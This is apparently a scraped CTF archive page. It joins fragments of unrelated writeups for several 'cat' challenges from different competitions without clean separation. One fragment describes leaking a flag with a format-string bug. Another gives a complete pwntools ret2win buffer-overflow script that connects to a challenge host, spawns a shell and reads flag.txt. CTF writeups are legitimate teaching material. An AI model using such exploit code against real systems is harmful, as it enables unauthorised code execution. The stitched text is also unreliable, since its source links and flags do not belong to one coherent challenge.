https://kileak.github.io/ctf/2018/asisquals18-cat/

Original writeup (https://kileak.github.io/ctf/2018/asisquals18-cat/).![image](https://github.com/jeromepalayoor/ctf-archive-
hub/assets/63996033/59e4ee20-8577-44dc-962d-36c0a0d15d77)

Simple format string bug. I tried to extract the flag using `%n$x` where n is
just positive integers. And decode using
[cyberchef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')Remove_null_bytes()&input=ZjdmNDQ1ODBmN2Y0NDAwMGY3ZjY1MmQwMjQzNjI1MDBmNzAwMGE3OGY3ZjQ0M2ZjNjE2YzY2MDM2MTYzN2I2NzY3NWY3Mzc0NjU2ZDVmNmY3ZDc3NmY).

![image](https://github.com/jeromepalayoor/ctf-archive-
hub/assets/63996033/4d655e3e-ba57-4ce4-a25c-c887bec438d5)

At the 14th element, the flag was done.

![image](https://github.com/jeromepalayoor/ctf-archive-
hub/assets/63996033/0d4fa087-a7f9-4913-a065-d92d9f2e6fec)

Flag: `flag{cats_go_meow}`

Original writeup (https://jpalayoor.com/pwn/HSCTF-10.html#cat).# cat - Beginner (50 pts)

## Description  
> meow  
>  
> `nc cat.wolvctf.io 1337`

### Provided files  
c_llenge - 64-bit ELF executable
\[[download](https://ctfnote.shinmai.wtf:31337/files/downloadFile?id=5kXe1neKxOAAjE6)\]  
callenge.c - the source code for the executable
\[[download](https://ctfnote.shinmai.wtf:31337/files/downloadFile?id=WEfUR4fytEbkXgf)\]  
Makefile - Makefile used to build the executable
\[[download](https://ctfnote.shinmai.wtf:31337/files/downloadFile?id=UZu5Vtv4MSILC2I)\]  
Dockerfile - Dockerfile used to host the challenge
\[[download](https://ctfnote.shinmai.wtf:31337/files/downloadFile?id=Enjowhsn8lsh9ZS)\]

## Ideas and observations  
1. based on the source code, the program prints some preamble, uses `gets()` to read user input into a buffer of 128 bytes, prints the buffer out and exits  
2. there's a `win()` function not called in the code that prints a message and spawns a shell with `system()`

## Notes  
1. a ret2win buffer overflow  
2. binary is 64-bit, so stack needs to be 16-byte aligned or `system()` will SEGFAULT

## Solution script  
```python  
from pwn import *

exe = ELF("challenge")  
context.binary = exe

p = process(exe.path)  
p.recvuntil(b"dangerous!\n")  
p.sendline(cyclic(250, n=8))  
p.wait()  
core = p.corefile  
offset = cyclic_find(core.read(core.rsp, 8), n=8)

rop = ROP(exe)  
ret=rop.find_gadget(["ret"])  
rop.raw(offset * b"A")  
rop.call(ret)  
rop.call(exe.symbols.win)

r = remote("cat.wolvctf.io", 1337)  
r.recvuntil(b"dangerous!\n")  
r.sendline(rop.chain())  
r.recv()  
r.sendline(b'cat flag.txt')  
print(r.recvS().strip())  
r.close()  
```

`wctf{d0n+_r0ll_y0ur_0wn_c_:3}`

Original writeup
(https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469#cat---
beginner-50-pts).[Writeup](https://haboob.sa/ctf/nullcon-2019/miscCat.html)

Original writeup (https://haboob.sa/ctf/nullcon-2019/miscCat.html).